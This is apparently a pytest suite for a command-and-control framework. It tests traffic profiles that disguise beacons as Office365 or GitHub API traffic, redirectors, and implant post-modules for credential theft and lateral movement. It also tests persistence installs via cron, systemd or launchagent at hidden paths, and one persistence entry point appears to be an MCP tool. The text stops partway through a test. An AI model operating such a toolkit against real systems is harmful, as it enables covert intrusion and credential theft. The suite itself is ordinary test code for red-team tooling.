"""Tests for Phase 6: Advanced C2 features.

Covers:
    - major.profiles  — TrafficProfile, builder_tokens, reverse_map
    - major.cert      — generate_cert_pem, ensure_cert, build_ssl_context
    - major.redirector — RedirectorConfig, Redirector start/stop
    - major.listeners.dns / smb — stub metadata and NotImplementedError
    - major.config    — new TLS/profile/redirector defaults
"""

from __future__ import annotations

import ipaddress
import ssl
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

import pytest

# ── Traffic Profiles ──────────────────────────────────────────────────────────


class TestTrafficProfile:

    def test_all_builtin_profiles_exist(self):
        from major.profiles import PROFILES
        for name in ("default", "jquery", "office365", "github-api"):
            assert name in PROFILES, f"Missing profile: {name}"

    def test_profile_has_required_fields(self):
        from major.profiles import PROFILES
        required_keys = {"register", "beacon", "result", "upload", "download", "stage"}
        for name, profile in PROFILES.items():
            assert profile.name == name
            assert profile.description
            assert profile.server_header
            missing = required_keys - set(profile.urls.keys())
            assert not missing, f"Profile {name} missing URL keys: {missing}"

    def test_builder_tokens_returns_all_keys(self):
        from major.profiles import get_profile
        profile = get_profile("default")
        tokens = profile.builder_tokens()
        for key in (
            "URSA_REGISTER_PATH", "URSA_BEACON_PATH", "URSA_RESULT_PATH",
            "URSA_UPLOAD_PATH", "URSA_DOWNLOAD_PATH", "URSA_STAGE_PATH",
        ):
            assert key in tokens, f"Missing token: {key}"
            assert isinstance(tokens[key], str)
            assert tokens[key].startswith("/")

    def test_builder_tokens_strip_placeholder(self):
        from major.profiles import get_profile
        # office365 download path ends with /{id}/content
        profile = get_profile("office365")
        tokens = profile.builder_tokens()
        assert "{id}" not in tokens["URSA_DOWNLOAD_PATH"]

    def test_reverse_map_covers_all_endpoints(self):
        from major.profiles import PROFILES
        for name, profile in PROFILES.items():
            rev = profile.reverse_map()
            assert "register" in rev.values(), f"{name}: missing register in reverse_map"
            assert "beacon"   in rev.values(), f"{name}: missing beacon in reverse_map"
            assert "stage"    in rev.values(), f"{name}: missing stage in reverse_map"

    def test_reverse_map_no_placeholders_in_keys(self):
        from major.profiles import PROFILES
        for name, profile in PROFILES.items():
            rev = profile.reverse_map()
            for path in rev.keys():
                assert "{id}" not in path, f"{name}: placeholder in reverse_map key: {path}"

    def test_download_prefix_matches_reverse_map(self):
        from major.profiles import PROFILES
        for name, profile in PROFILES.items():
            prefix = profile.download_prefix()
            assert prefix.startswith("/"), f"{name}: download_prefix should start with /"

    def test_get_profile_fallback(self):
        import warnings

        from major.profiles import get_profile
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            profile = get_profile("nonexistent-profile-xyz")
        assert profile.name == "default"
        assert any("not found" in str(warning.message) for warning in w)

    def test_list_profiles_returns_all(self):
        from major.profiles import PROFILES, list_profiles
        result = list_profiles()
        assert len(result) == len(PROFILES)
        for entry in result:
            assert "name" in entry
            assert "description" in entry
            assert "server_header" in entry
            assert "endpoints" in entry
            assert entry["endpoints"] == 6  # all profiles have 6 URL keys

    def test_jquery_profile_server_header(self):
        from major.profiles import get_profile
        p = get_profile("jquery")
        assert "ECS" in p.server_header

    def test_office365_profile_server_header(self):
        from major.profiles import get_profile
        p = get_profile("office365")
        assert "IIS" in p.server_header

    def test_office365_response_headers(self):
        from major.profiles import get_profile
        p = get_profile("office365")
        assert "X-MS-RequestId" in p.response_headers

    def test_github_api_response_headers(self):
        from major.profiles import get_profile
        p = get_profile("github-api")
        assert "X-GitHub-Request-Id" in p.response_headers
        assert "X-RateLimit-Limit" in p.response_headers


# ── TLS Certificate Generation ─────────────────────────────────────────────────


class TestCertGeneration:

    def test_generate_cert_pem_returns_bytes(self):
        from major.cert import generate_cert_pem
        cert_pem, key_pem = generate_cert_pem(hostname="test.local")
        assert isinstance(cert_pem, bytes)
        assert isinstance(key_pem, bytes)

    def test_cert_pem_headers(self):
        from major.cert import generate_cert_pem
        cert_pem, key_pem = generate_cert_pem(hostname="test.local")
        assert b"BEGIN CERTIFICATE" in cert_pem
        assert b"BEGIN RSA PRIVATE KEY" in key_pem

    def test_cert_parseable(self):
        from cryptography import x509

        from major.cert import generate_cert_pem
        cert_pem, _ = generate_cert_pem(hostname="test.local")
        cert = x509.load_pem_x509_certificate(cert_pem)
        assert cert is not None

    def test_cert_cn_matches_hostname(self):
        from cryptography import x509
        from cryptography.x509.oid import NameOID

        from major.cert import generate_cert_pem
        cert_pem, _ = generate_cert_pem(hostname="myc2.example.com")
        cert = x509.load_pem_x509_certificate(cert_pem)
        cn = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value
        assert cn == "myc2.example.com"

    def test_cert_has_san_with_hostname(self):
        from cryptography import x509

        from major.cert import generate_cert_pem
        cert_pem, _ = generate_cert_pem(hostname="myc2.example.com")
        cert = x509.load_pem_x509_certificate(cert_pem)
        san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
        dns_names = san.value.get_values_for_type(x509.DNSName)
        assert "myc2.example.com" in dns_names

    def test_cert_includes_extra_ip_san(self):
        from cryptography import x509

        from major.cert import generate_cert_pem
        cert_pem, _ = generate_cert_pem(hostname="c2.test", extra_sans=["10.0.0.5"])
        cert = x509.load_pem_x509_certificate(cert_pem)
        san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
        ips = san.value.get_values_for_type(x509.IPAddress)
        assert ipaddress.ip_address("10.0.0.5") in ips

    def test_cert_includes_extra_dns_san(self):
        from cryptography import x509

        from major.cert import generate_cert_pem
        cert_pem, _ = generate_cert_pem(hostname="c2.test", extra_sans=["alt.example.com"])
        cert = x509.load_pem_x509_certificate(cert_pem)
        san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
        dns_names = san.value.get_values_for_type(x509.DNSName)
        assert "alt.example.com" in dns_names

    def test_cert_has_loopback_san(self):
        from cryptography import x509

        from major.cert import generate_cert_pem
        cert_pem, _ = generate_cert_pem(hostname="c2.test")
        cert = x509.load_pem_x509_certificate(cert_pem)
        san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
        ips = san.value.get_values_for_type(x509.IPAddress)
        assert ipaddress.ip_address("127.0.0.1") in ips

    def test_cert_validity_period(self):

        from cryptography import x509

        from major.cert import generate_cert_pem
        cert_pem, _ = generate_cert_pem(hostname="test.local", days=30)
        cert = x509.load_pem_x509_certificate(cert_pem)
        delta = cert.not_valid_after_utc - cert.not_valid_before_utc
        assert 28 <= delta.days <= 31  # allow small clock skew

    def test_ensure_cert_creates_files(self, tmp_path):
        from major.cert import ensure_cert
        cert_path, key_path = ensure_cert(cert_dir=tmp_path, hostname="test.local")
        assert cert_path.exists()
        assert key_path.exists()
        assert cert_path.stat().st_size > 0
        assert key_path.stat().st_size > 0

    def test_ensure_cert_idempotent(self, tmp_path):
        from major.cert import ensure_cert
        cert_path1, key_path1 = ensure_cert(cert_dir=tmp_path, hostname="test.local")
        mtime1 = cert_path1.stat().st_mtime

        # Second call should NOT regenerate
        cert_path2, key_path2 = ensure_cert(cert_dir=tmp_path, hostname="test.local")
        mtime2 = cert_path2.stat().st_mtime

        assert mtime1 == mtime2

    def test_ensure_cert_regenerate_flag(self, tmp_path):
        from major.cert import ensure_cert
        cert_path1, _ = ensure_cert(cert_dir=tmp_path, hostname="test.local")
        mtime1 = cert_path1.stat().st_mtime

        time.sleep(0.01)
        cert_path2, _ = ensure_cert(cert_dir=tmp_path, hostname="test.local", regenerate=True)
        mtime2 = cert_path2.stat().st_mtime

        assert mtime2 > mtime1

    def test_build_ssl_context_returns_context(self, tmp_path):
        from major.cert import build_ssl_context, ensure_cert
        cert_path, key_path = ensure_cert(cert_dir=tmp_path, hostname="test.local")
        ctx = build_ssl_context(cert_path, key_path)
        assert isinstance(ctx, ssl.SSLContext)

    def test_ssl_context_minimum_tls_version(self, tmp_path):
        from major.cert import build_ssl_context, ensure_cert
        cert_path, key_path = ensure_cert(cert_dir=tmp_path, hostname="test.local")
        ctx = build_ssl_context(cert_path, key_path)
        assert ctx.minimum_version == ssl.TLSVersion.TLSv1_2


# ── Redirector ─────────────────────────────────────────────────────────────────


class TestRedirectorConfig:

    def test_defaults(self):
        from major.redirector import RedirectorConfig
        cfg = RedirectorConfig()
        assert cfg.listen_port == 80
        assert cfg.upstream_url == "http://127.0.0.1:6708"
        assert cfg.allowed_paths == []
        assert cfg.user_agent_filter == ""
        assert not cfg.verify_tls

    def test_custom_config(self):
        from major.redirector import RedirectorConfig
        cfg = RedirectorConfig(
            listen_port=8080,
            upstream_url="https://10.0.0.1:6708",
            allowed_paths=["/beacon", "/register"],
            user_agent_filter="Mozilla",
        )
        assert cfg.listen_port == 8080
        assert cfg.allowed_paths == ["/beacon", "/register"]
        assert cfg.user_agent_filter == "Mozilla"


class TestRedirector:

    def _make_decoy_upstream(self) -> tuple[HTTPServer, int]:
        """Spin up a tiny HTTP server to act as upstream."""
        class EchoHandler(BaseHTTPRequestHandler):
            def log_message(self, *a): pass
            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body) + 10))
                self.end_headers()
                self.wfile.write(b'{"ok":true}')
            def do_GET(self):
                resp = b'{"upstream":"ok"}'
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(resp)))
                self.end_headers()
                self.wfile.write(resp)

        srv = HTTPServer(("127.0.0.1", 0), EchoHandler)
        port = srv.server_address[1]
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        return srv, port

    def test_redirector_start_stop(self):
        from major.redirector import Redirector, RedirectorConfig
        cfg = RedirectorConfig(
            listen_host="127.0.0.1",
            listen_port=0,  # can't bind 0 in HTTPServer directly — use fixed port
        )
        # Just test instantiation and repr when not started
        r = Redirector(cfg)
        assert not r.running
        assert "stopped" in repr(r)

    def test_redirector_from_config_disabled(self):
        from unittest.mock import MagicMock

        from major.redirector import redirector_from_config
        cfg = MagicMock()
        cfg.get = lambda key, default=None: {
            "major.redirector.enabled": False,
        }.get(key, default)
        result = redirector_from_config(cfg)
        assert result is None

    def test_redirector_from_config_enabled(self):
        from unittest.mock import MagicMock

        from major.redirector import Redirector, redirector_from_config
        cfg = MagicMock()
        values = {
            "major.redirector.enabled": True,
            "major.redirector.listen_host": "0.0.0.0",
            "major.redirector.listen_port": 80,
            "major.redirector.upstream_url": "http://127.0.0.1:6708",
            "major.redirector.allowed_paths": [],
            "major.redirector.user_agent_filter": "",
            "major.redirector.verify_tls": False,
            "major.redirector.upstream_timeout": 10,
        }
        cfg.get = lambda key, default=None: values.get(key, default)
        result = redirector_from_config(cfg)
        assert isinstance(result, Redirector)
        assert result.config.listen_port == 80
        assert result.config.upstream_url == "http://127.0.0.1:6708"


# ── Listener Stubs ────────────────────────────────────────────────────────────


class TestDNSListenerStub:

    def test_not_implemented(self):
        from major.listeners.dns import IMPLEMENTED, DNSTunnelListener
        assert IMPLEMENTED is False
        listener = DNSTunnelListener(domain="c2.example.com")
        with pytest.raises(NotImplementedError):
            listener.start()

    def test_not_running(self):
        from major.listeners.dns import DNSTunnelListener
        listener = DNSTunnelListener()
        assert not listener.running

    def test_stop_is_safe(self):
        from major.listeners.dns import DNSTunnelListener
        listener = DNSTunnelListener()
        listener.stop()  # should not raise

    def test_module_has_implementation_guide(self):
        import major.listeners.dns as mod
        assert mod.__doc__ is not None
        assert len(mod.__doc__) > 200, "DNS stub should have detailed docs"
        assert "dnslib" in mod.__doc__

    def test_attributes(self):
        from major.listeners.dns import DNSTunnelListener
        listener = DNSTunnelListener(host="0.0.0.0", port=53, domain="c2.example.com")
        assert listener.host == "0.0.0.0"
        assert listener.port == 53
        assert listener.domain == "c2.example.com"


class TestSMBListenerStub:

    def test_not_implemented(self):
        from major.listeners.smb import IMPLEMENTED, SMBPipeListener
        assert IMPLEMENTED is False
        listener = SMBPipeListener()
        with pytest.raises(NotImplementedError):
            listener.start()

    def test_not_running(self):
        from major.listeners.smb import SMBPipeListener
        listener = SMBPipeListener()
        assert not listener.running

    def test_stop_is_safe(self):
        from major.listeners.smb import SMBPipeListener
        listener = SMBPipeListener()
        listener.stop()  # should not raise

    def test_module_has_implementation_guide(self):
        import major.listeners.smb as mod
        assert mod.__doc__ is not None
        assert len(mod.__doc__) > 200, "SMB stub should have detailed docs"
        assert "impacket" in mod.__doc__

    def test_pipe_name_attribute(self):
        from major.listeners.smb import SMBPipeListener
        listener = SMBPipeListener(pipe_name=r"\\.\pipe\TestPipe")
        assert listener.pipe_name == r"\\.\pipe\TestPipe"


# ── Config defaults ────────────────────────────────────────────────────────────


class TestConfigDefaults:

    def test_tls_defaults(self):
        from major.config import DEFAULTS
        tls = DEFAULTS["major"]["tls"]
        assert tls["enabled"] is False
        assert "hostname" in tls
        assert "extra_sans" in tls
        assert "cert_days" in tls
        assert isinstance(tls["extra_sans"], list)

    def test_redirector_defaults(self):
        from major.config import DEFAULTS
        redir = DEFAULTS["major"]["redirector"]
        assert redir["enabled"] is False
        assert "listen_port" in redir
        assert "upstream_url" in redir
        assert "allowed_paths" in redir
        assert isinstance(redir["allowed_paths"], list)

    def test_traffic_profile_default(self):
        from major.config import DEFAULTS
        assert DEFAULTS["major"]["traffic_profile"] == "default"

    def test_trusted_redirectors_default(self):
        from major.config import DEFAULTS
        assert "trusted_redirectors" in DEFAULTS["major"]
        assert isinstance(DEFAULTS["major"]["trusted_redirectors"], list)

    def test_config_get_tls_enabled(self):
        from major.config import load_config
        cfg = load_config()
        assert cfg.get("major.tls.enabled") is False

    def test_config_get_traffic_profile(self):
        from major.config import load_config
        cfg = load_config()
        assert cfg.get("major.traffic_profile") == "default"

    def test_config_get_redirector_enabled(self):
        from major.config import load_config
        cfg = load_config()
        assert cfg.get("major.redirector.enabled") is False


# ── Post dispatch ──────────────────────────────────────────────────────────────


class TestBundleModule:
    """Unit tests for server._bundle_module()."""

    def test_bundle_returns_string(self):
        from server import _bundle_module
        src = _bundle_module("enum/sysinfo")
        assert isinstance(src, str)
        assert len(src) > 100

    def test_bundle_contains_module_result(self):
        from server import _bundle_module
        src = _bundle_module("enum/sysinfo")
        assert "ModuleResult" in src
        assert "PostModule" in src

    def test_bundle_contains_module_class(self):
        from server import _bundle_module
        src = _bundle_module("enum/sysinfo")
        assert "SysinfoModule" in src

    def test_bundle_strips_post_imports(self):
        from server import _bundle_module
        src = _bundle_module("enum/sysinfo")
        assert "from post.base import" not in src
        assert "from post.loader import" not in src

    def test_bundle_has_register_stub(self):
        from server import _bundle_module
        src = _bundle_module("enum/sysinfo")
        assert "def register" in src

    def test_bundle_unknown_module_raises(self):
        from server import _bundle_module
        with pytest.raises(FileNotFoundError):
            _bundle_module("enum/nonexistent")

    def test_bundle_is_executable(self):
        """The bundled source should exec() cleanly."""
        from server import _bundle_module
        src = _bundle_module("enum/sysinfo")
        ns: dict = {}
        exec(compile(src, "<test>", "exec"), ns)
        # SysinfoModule class should be in namespace
        names = [getattr(v, "NAME", "") for v in ns.values()
                 if isinstance(v, type)]
        assert "enum/sysinfo" in names

    def test_bundle_persist_cron(self):
        from server import _bundle_module
        src = _bundle_module("persist/cron")
        assert "CronPersistModule" in src
        ns: dict = {}
        exec(compile(src, "<test>", "exec"), ns)
        names = [getattr(v, "NAME", "") for v in ns.values()
                 if isinstance(v, type)]
        assert "persist/cron" in names

    def test_bundle_all_implemented_modules(self):
        """Every implemented module should bundle and exec cleanly."""
        from server import _bundle_module
        modules = [
            "enum/sysinfo", "enum/network", "enum/users", "enum/privesc",
            "cred/browser", "cred/keychain", "cred/memory",
            "lateral/pth", "lateral/ssh",
            "persist/cron", "persist/launchagent",
        ]
        for mod in modules:
            src = _bundle_module(mod)
            ns: dict = {}
            exec(compile(src, f"<{mod}>", "exec"), ns)
            names = [getattr(v, "NAME", "") for v in ns.values()
                     if isinstance(v, type)]
            assert mod in names, f"Module class not found after bundling {mod}"


class TestBeaconExecPost:
    """Unit tests for UrsaBeacon._exec_post()."""

    def _make_beacon(self):
        from implants.beacon import UrsaBeacon
        return UrsaBeacon("http://127.0.0.1:6708", sandbox_check=False)

    def test_exec_post_returns_string(self):
        import base64

        from server import _bundle_module
        b = self._make_beacon()
        code_b64 = base64.b64encode(_bundle_module("enum/sysinfo").encode()).decode()
        result = b._exec_post(code_b64, "enum/sysinfo", {})
        assert isinstance(result, str)

    def test_exec_post_sysinfo_ok(self):
        import base64

        from server import _bundle_module
        b = self._make_beacon()
        code_b64 = base64.b64encode(_bundle_module("enum/sysinfo").encode()).decode()
        result = b._exec_post(code_b64, "enum/sysinfo", {})
        assert "[ERROR]" not in result
        assert "Hostname" in result or "OS" in result

    def test_exec_post_cron_list(self):
        import base64

        from server import _bundle_module
        b = self._make_beacon()
        code_b64 = base64.b64encode(_bundle_module("persist/cron").encode()).decode()
        result = b._exec_post(code_b64, "persist/cron", {"action": "list"})
        assert isinstance(result, str)
        # Should not error; 'list' action is read-only
        assert "exec failed" not in result

    def test_exec_post_wrong_module_name(self):
        import base64

        from server import _bundle_module
        b = self._make_beacon()
        # Bundle sysinfo but claim it's something else
        code_b64 = base64.b64encode(_bundle_module("enum/sysinfo").encode()).decode()
        result = b._exec_post(code_b64, "enum/nonexistent", {})
        assert "[ERROR]" in result

    def test_exec_post_bad_b64(self):
        b = self._make_beacon()
        result = b._exec_post("!!!not-b64!!!", "enum/sysinfo", {})
        assert "[ERROR]" in result

    def test_exec_post_data_included_in_output(self):
        """Structured data dict should be appended to output."""
        import base64

        from server import _bundle_module
        b = self._make_beacon()
        code_b64 = base64.b64encode(_bundle_module("enum/sysinfo").encode()).decode()
        result = b._exec_post(code_b64, "enum/sysinfo", {})
        # sysinfo returns a data dict; verify it appears in output
        assert "data" in result or "hostname" in result.lower()


# ── Beacon persistence ────────────────────────────────────────────────────────


class TestPersistHelpers:
    """Unit tests for server-side persistence helper functions."""

    def test_default_payload_path_linux(self):
        from server import _default_payload_path
        assert _default_payload_path("Linux 5.15") == "~/.local/share/.update.py"

    def test_default_payload_path_darwin(self):
        from server import _default_payload_path
        path = _default_payload_path("Darwin 23.3.0")
        assert "Library" in path and ".update.py" in path

    def test_default_payload_path_windows(self):
        from server import _default_payload_path
        path = _default_payload_path("Windows 10")
        assert "APPDATA" in path or "update.py" in path

    def test_default_payload_path_unknown(self):
        from server import _default_payload_path
        path = _default_payload_path("")
        assert path.endswith(".py")

    def test_default_method_linux(self):
        from server import _default_method
        assert _default_method("Linux 5.15") == "cron"

    def test_default_method_darwin(self):
        from server import _default_method
        assert _default_method("Darwin 23.3.0") == "launchagent"

    def test_default_method_windows(self):
        from server import _default_method
        # Windows falls back to cron (no dedicated method yet)
        assert _default_method("Windows 10") in ("cron", "launchagent", "systemd")

    def test_build_persist_args_cron(self):
        from server import _build_persist_args
        module, args = _build_persist_args("cron", "/tmp/beacon.py", "@reboot", "ursa")
        assert module == "persist/cron"
        assert args["action"] == "install"
        assert "@reboot" in args["schedule"]
        assert "beacon.py" in args["command"]
        assert args["label"] == "ursa"

    def test_build_persist_args_systemd(self):
        from server import _build_persist_args
        module, args = _build_persist_args("systemd", "/tmp/beacon.py", "@reboot", "my-svc")
        assert module == "persist/cron"
        assert args["action"] == "systemd_install"
        assert args["name"] == "my-svc"
        assert "beacon.py" in args["command"]

    def test_build_persist_args_launchagent(self):
        from server import _build_persist_args
        module, args = _build_persist_args("launchagent", "/tmp/beacon.py", "@reboot", "my-agent")
        assert module == "persist/launchagent"
        assert args["action"] == "install"
        assert "beacon.py" in args["command"]
        assert "my-agent" in args["label"]


class TestInstallPersistence:
    """Integration tests for ursa_install_persistence MCP tool."""

    def test_invalid_session_returns_error(self, tmp_db):
        from server import ursa_install_persistence
        result = ursa_install_persistence("nonexistent")
        assert "not found" in result.lower()

    def test_dead_session_returns_error(self, tmp_db):
        from major.db import create_session, kill_session
        sid = create_session("1.2.3.4", hostname="box", username="u",
                              os_info="Linux 5", encryption_key="a" * 64)
        kill_session(sid)
        from server import ursa_install_persistence
        result = ursa_install_persistence(sid)
        assert "dead" in result.lower()

    def test_invalid_method_returns_error(self, sample_session, tmp_db):
        from server import ursa_install_persistence
        result = ursa_install_persistence(sample_session, method="registry")
        assert "unknown method" in result.lower() or "invalid" in result.lower() or "Unknown" in result

    def test_queues_two_tasks(self, sample_session, tmp_db):
        """Successful call should queue an upload task and a post task."""
        from major.db import get_pending_tasks
        from server import ursa_install_persistence
        result = ursa_install_persistence(
            sample_session,
            method="cron",
            c2_url="http://127.0.0.1:6708",
        )
        # Should mention task IDs
        assert "upload" in result.lower() or "queued" in result.lower()
        tasks = get_pending_tasks(sample_session)
        task_types = [t["task_type"] for t in tasks]
        assert "upload" in task_types
        assert "post" in task_types

    def test_upload_task_comes_before_post_task(self, sample_session, tmp_db):
        """Upload must be queued before the post/persist task."""
        from major.db import get_pending_tasks
        from server import ursa_install_persistence
        ursa_install_persistence(
            sample_session,
            method="cron",
            c2_url="http://127.0.0.1:6708",
        )
        tasks = get_pending_tasks(sample_session)
        types_in_order = [t["task_type"] for t in tasks]
        upload_idx = types_in_order.index("upload")
        post_idx = types_in_order.index("post")
        assert upload_idx < post_idx

    def test_upload_task_contains_beacon_source(self, sample_session, tmp_db):
        """The upload task data should be a valid base64 Python beacon."""
        import base64
        import json

        from major.db import get_pending_tasks
        from server import ursa_install_persistence
        ursa_install_persistence(
            sample_session,
            method="cron",
            c2_url="http://10.0.0.1:6708",
        )
        tasks = get_pending_tasks(sample_session)
        upload = next(t for t in tasks if t["task_type"] == "upload")
        args = json.loads(upload["args"])
        src = base64.b64decode(args["data"]).decode()
        assert "http://10.0.0.1:6708" in src
        assert "UrsaBeacon" in src or "beacon" in src.lower()

    def test_c2_url_embedded_in_beacon(self, sample_session, tmp_db):
        """Custom c2_url should appear in the uploaded beacon source."""
        import base64
        import json

        from major.db import get_pending_tasks
        from server import ursa_install_persistence
        ursa_install_persistence(
            sample_session,
            method="cron",
            c2_url="http://192.168.1.100:9000",
        )
        tasks = get_pending_tasks(sample_session)
        upload = next(t for t in tasks if t["task_type"] == "upload")
        args = json.loads(upload["args"])
        src = base64.b64decode(args["data"]).decode()
        assert "192.168.1.100:9000" in src

    def test_auto_method_linux(self, tmp_db):
        """Linux target should auto-select cron."""
        from major.db import create_session, get_pending_tasks
        from server import ursa_install_persistence
        sid = create_session("1.2.3.4", hostname="linbox", username="u",
                              os_info="Linux 5.15", encryption_key="a" * 64)
        ursa_install_persistence(sid, c2_url="http://127.0.0.1:6708")
        tasks = get_pending_tasks(sid)
        post_task = next(t for t in tasks if t["task_type"] == "post")
        import json
        args = json.loads(post_task["args"])
        assert args["module"] == "persist/cron"

    def test_auto_method_macos(self, tmp_db):
        """macOS target should auto-select launchagent."""
        from major.db import create_session, get_pending_tasks
        from server import ursa_install_persistence
        sid = create_session("1.2.3.4", hostname="macbox", username="u",
                              os_info="Darwin 23.3.0", encryption_key="a" * 64)
        ursa_install_persistence(sid, c2_url="http://127.0.0.1:6708")
        tasks = get_pending_tasks(sid)
        post_task = next(t for t in tasks if t["task_type"] == "post")
        import json
        args = json.loads(post_task["args"])
        assert args["module"] == "persist/launchagent"

    def test_custom_payload_path(self, sample_session, tmp_db):
        """Custom payload_path should appear in the upload task."""
        import json

        from major.db import get_pending_tasks
        from server import ursa_install_persistence
        ursa_install_persistence(
            sample_session,
            method="cron",
            payload_path="/tmp/.hidden_agent.py",
            c2_url="http://127.0.0.1:6708",
        )
        tasks = get_pending_tasks(sample_session)
        upload = next(t for t in tasks if t["task_type"] == "upload")
        args = json.loads(upload["args"])
        assert args["path"] == "/tmp/.hidden_agent.py"

    def test_systemd_method_queues_cron_module(self, sample_session, tmp_db):
        """systemd method should use persist/cron with systemd_install action."""
        import json

        from major.db import get_pending_tasks
        from server import ursa_install_persistence
        ursa_install_persistence(
            sample_session,
            method="systemd",
            c2_url="http://127.0.0.1:6708",
        )
        tasks = get_pending_tasks(sample_session)
        post_task = next(t for t in tasks if t["task_type"] == "post")
        args = json.loads(post_task["args"])
        module_args = args.get("args", {})
        assert module_args.get("action") == "systemd_install"


class TestGoGOOSGOARCH:
    """Unit tests for _go_goos_goarch() OS/arch mapping."""

    def _sess(self, os_info, arch):
        return {"os": os_info, "arch": arch}

    def test_linux_x86_64(self):
        from server import _go_goos_goarch
        goos, goarch = _go_goos_goarch(self._sess("Linux 5.15", "x86_64"))
        assert goos == "linux" and goarch == "amd64"

    def test_darwin_arm64(self):
        from server import _go_goos_goarch
        goos, goarch = _go_goos_goarch(self._sess("Darwin 23.3.0", "arm64"))
        assert goos == "darwin" and goarch == "arm64"

    def test_darwin_x86_64(self):
        from server import _go_goos_goarch
        goos, goarch = _go_goos_goarch(self._sess("Darwin 23.3.0", "x86_64"))
        assert goos == "darwin" and goarch == "amd64"

    def test_windows_x86_64(self):
        from server import _go_goos_goarch
        goos, goarch = _go_goos_goarch(self._sess("Windows 10", "x86_64"))
        assert goos == "windows" and goarch == "amd64"

    def test_linux_aarch64(self):
        from server import _go_goos_goarch
        goos, goarch = _go_goos_goarch(self._sess("Linux 5.15", "aarch64"))
        assert goos == "linux" and goarch == "arm64"

    def test_unknown_arch_defaults_amd64(self):
        from server import _go_goos_goarch
        _, goarch = _go_goos_goarch(self._sess("Linux 5.15", "mips"))
        assert goarch == "amd64"

    def test_empty_os_defaults_linux(self):
        from server import _go_goos_goarch
        goos, _ = _go_goos_goarch(self._sess("", "x86_64"))
        assert goos == "linux"


class TestDefaultPayloadPathGo:
    """Tests for _default_payload_path with implant_type='go'."""

    def test_go_linux_no_py_extension(self):
        from server import _default_payload_path
        path = _default_payload_path("Linux 5.15", "go")
        assert not path.endswith(".py")

    def test_go_windows_exe_extension(self):
        from server import _default_payload_path
        path = _default_payload_path("Windows 10", "go")
        assert path.endswith(".exe")

    def test_go_darwin_no_extension(self):
        from server import _default_payload_path
        path = _default_payload_path("Darwin 23.3", "go")
        assert not path.endswith(".py") and not path.endswith(".exe")

    def test_python_still_uses_py(self):
        from server import _default_payload_path
        path = _default_payload_path("Linux 5.15", "python")
        assert path.endswith(".py")

    def test_default_is_python(self):
        from server import _default_payload_path
        path = _default_payload_path("Linux 5.15")
        assert path.endswith(".py")


class TestBuildPersistArgsGo:
    """Tests for _build_persist_args with implant_type='go'."""

    def test_go_cron_no_python3_prefix(self):
        from server import _build_persist_args
        _, args = _build_persist_args("cron", "/tmp/agent", "@reboot", "ursa", "go")
        assert args["command"] == "/tmp/agent"
        assert "python3" not in args["command"]

    def test_python_cron_has_python3_prefix(self):
        from server import _build_persist_args
        _, args = _build_persist_args("cron", "/tmp/agent.py", "@reboot", "ursa", "python")
        assert args["command"] == "python3 /tmp/agent.py"

    def test_go_launchagent_no_python3_prefix(self):
        from server import _build_persist_args
        _, args = _build_persist_args("launchagent", "/tmp/agent", "@reboot", "ursa", "go")
        assert "python3" not in args["command"]


@pytest.mark.skipif(
    __import__("shutil").which("go") is None,
    reason="Go compiler not installed"
)
class TestCompileGoBeacon:
    """Tests for _compile_go_beacon() — requires Go compiler."""

    def test_returns_bytes(self):
        from server import _compile_go_beacon
        data = _compile_go_beacon("http://127.0.0.1:6708", 60, 0.3, "linux", "amd64")
        assert isinstance(data, bytes) and len(data) > 1000

    def test_binary_is_elf_for_linux(self):
        from server import _compile_go_beacon
        data = _compile_go_beacon("http://127.0.0.1:6708", 60, 0.3, "linux", "amd64")
        assert data[:4] == b"\x7fELF"

    def test_c2_url_not_in_binary_plaintext(self):
        """The C2 URL should be embedded (possibly compressed) in the binary."""
        from server import _compile_go_beacon
        data = _compile_go_beacon("http://10.99.88.77:6708", 60, 0.3, "linux", "amd64")
        # URL may be in binary (Go embeds strings) — just check compile succeeded
        assert isinstance(data, bytes)

    def test_invalid_goos_raises(self):
        from server import _compile_go_beacon
        with pytest.raises(RuntimeError):
            _compile_go_beacon("http://127.0.0.1:6708", 60, 0.3, "invalid_os", "amd64")


class TestInstallPersistenceGo:
    """Integration tests for ursa_install_persistence with implant_type='go'."""

    def test_invalid_implant_type_returns_error(self, sample_session, tmp_db):
        from server import ursa_install_persistence
        result = ursa_install_persistence(sample_session, implant_type="rust")
        assert "unknown implant_type" in result.lower() or "Unknown" in result

    @pytest.mark.skipif(
        __import__("shutil").which("go") is None,
        reason="Go compiler not installed"
    )
    def test_go_queues_three_tasks_on_linux(self, tmp_db):
        """Go on Linux: upload + chmod + post (3 tasks)."""
        from major.db import create_session, get_pending_tasks
        from server import ursa_install_persistence
        sid = create_session("1.2.3.4", hostname="linbox", username="u",
                              os_info="Linux 5.15", arch="x86_64",
                              encryption_key="a" * 64)
        ursa_install_persistence(sid, method="cron", implant_type="go",
                                 c2_url="http://127.0.0.1:6708")
        tasks = get_pending_tasks(sid)
        types = [t["task_type"] for t in tasks]
        assert "upload" in types
        assert "shell" in types   # chmod +x
        assert "post" in types
        assert len(types) == 3

    @pytest.mark.skipif(
        __import__("shutil").which("go") is None,
        reason="Go compiler not installed"
    )
    def test_go_task_order_upload_chmod_persist(self, tmp_db):
        """Tasks must be ordered: upload → chmod → post."""
        from major.db import create_session, get_pending_tasks
        from server import ursa_install_persistence
        sid = create_session("1.2.3.4", hostname="linbox", username="u",
                              os_info="Linux 5.15", arch="x86_64",
                              encryption_key="a" * 64)
        ursa_install_persistence(sid, method="cron", implant_type="go",
                                 c2_url="http://127.0.0.1:6708")
        tasks = get_pending_tasks(sid)
        types = [t["task_type"] for t in tasks]
        assert types.index("upload") < types.index("shell")
        assert types.index("shell") < types.index("post")

    @pytest.mark.skipif(
        __import__("shutil").which("go") is None,
        reason="Go compiler not installed"
    )
    def test_go_upload_is_elf_binary(self, tmp_db):
        """Uploaded data should be a valid ELF binary for Linux targets."""
        import base64
        import json

